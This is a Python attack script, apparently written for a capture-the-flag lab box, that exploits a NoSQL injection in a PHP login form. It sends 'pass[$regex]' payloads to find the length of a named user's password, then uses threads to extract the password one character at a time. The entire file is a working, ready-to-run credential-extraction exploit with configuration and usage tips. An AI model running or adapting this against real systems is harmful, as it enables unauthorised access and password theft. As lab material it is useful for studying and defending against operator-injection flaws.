#!/usr/bin/env python3

import string  # for getting all printable characters
import requests  # for sending requests
import threading  # for spawning threads, you don't wanna try one digit at a time
import urllib.parse  # for url encoding of special characters


# CHANGE THIS VALUES AS PER YOUR NEEDS
IP = '10.10.237.121'  # IP of the server
USERNAME = 'john'  # username of the user????

# YOU DON"T HAVE TO CHANGE ANYTHING BELOW THIS LINE
PASSWORD_LENGTH = 15  # this is temporary, it will change automatically
final_password = ['_'] * PASSWORD_LENGTH

# special characters of regex, IF YOU THINK ANY OF THE CHARACTERS ARE MISSING, PLEASE TELL ME
special_chars = """\^$.|?*+()[]{}"""


def get_password(index):
    """
    function to get the password character at the given index
    """

    # Headers generated while making request
    # This is copied from BURP SUITE.
    # Just copy request from BURP SUITE as cURL and
    # use https://curlconverter.com/ to convert it to python
    headers = {
        'Host': IP,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '41',
        'Origin': f'http://{IP}',
        'Connection': 'close',
        'Referer': f'http://{IP}/?err=1',
        'Upgrade-Insecure-Requests': '1',
    }

    # We need '.' for other characters except our specified indexed character
    chars = ['.'] * PASSWORD_LENGTH

    # Now we will go through all printable characters from string.printable
    # REMEBER: string.printable does not contain all password characters, if you don't find you password
    # inside this set, then try larger sets of characters.
    for c in string.printable:
        # Put our character at the index
        chars[index] = c

        # Escape special characters of regex
        if c in special_chars:
            chars[index] = '\\' + c

        # Create our regex string
        check = '^' + ''.join(chars) + '$'
        print(f'[*] trying: {check}')

        # URL encode before sending it to request, mostly '+' and '&' are problematic
        check = urllib.parse.quote_plus(check)

        # Create query string
        data = f'user={USERNAME}&pass[$regex]={check}&remember=on'

        # Send request
        r = requests.post(f'http://{IP}/login.php',
                          headers=headers, data=data, verify=False)

        # If you get successful login then you will get following string in html
        if f'<td>User:</td><td>{USERNAME}</td>' in r.text:
            final_password[index] = c

            print('-' * 50)

            password_f = ''.join(final_password)

            print(f'[+] Password found so far => {USERNAME}:{password_f}')

            print('-' * 50)

            # NO need to continue, we found the password character at our index
            break


# First of all we will try to find the password length of user
# Range of the length can be decreased or increased as per requirements and availability.
for i in range(2, 30):
    # Headers generated while making request
    # This is copied from BURP SUITE.
    # Just copy request from BURP SUITE as cURL and
    # use https://curlconverter.com/ to convert it to python
    headers = {
        'Host': IP,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '41',
        'Origin': f'http://{IP}',
        'Connection': 'close',
        'Referer': f'http://{IP}/?err=1',
        'Upgrade-Insecure-Requests': '1',
    }

    # Create regex string
    check = '^.{' + str(i) + '}$'
    # create query string
    data = f'user={USERNAME}&pass[$regex]={check}&remember=on'
    print(f'[*] trying: {data}')

    r = requests.post(f'http://{IP}/login.php',
                      headers=headers, data=data, verify=False)

    # If you get successful login then you will get following string in html
    if f'<td>User:</td><td>{USERNAME}</td>' in r.text:
        print('-' * 50)
        print('[+] Password Length Found: ', i)
        print('-' * 50)

        # Set the global variables for further processing
        PASSWORD_LENGTH = i
        final_password = ['_'] * PASSWORD_LENGTH

        # No need to continue, we found the password length
        break


# We will spawn threads to get password characters
# Number of threads will be equal to password length, read last comment block for more info
for i in range(PASSWORD_LENGTH):
    threading.Thread(target=get_password, args=(i,)).start()


# there are two ways of spawning threads
# Spawn threads equvalent to number of password length (which is used in this)
# OR spawn threads equal to number of characters in your character set, But I think this will be too expensive,
# In both terms, resource and network usage. I don't have any of them so I am sticking with first approach.
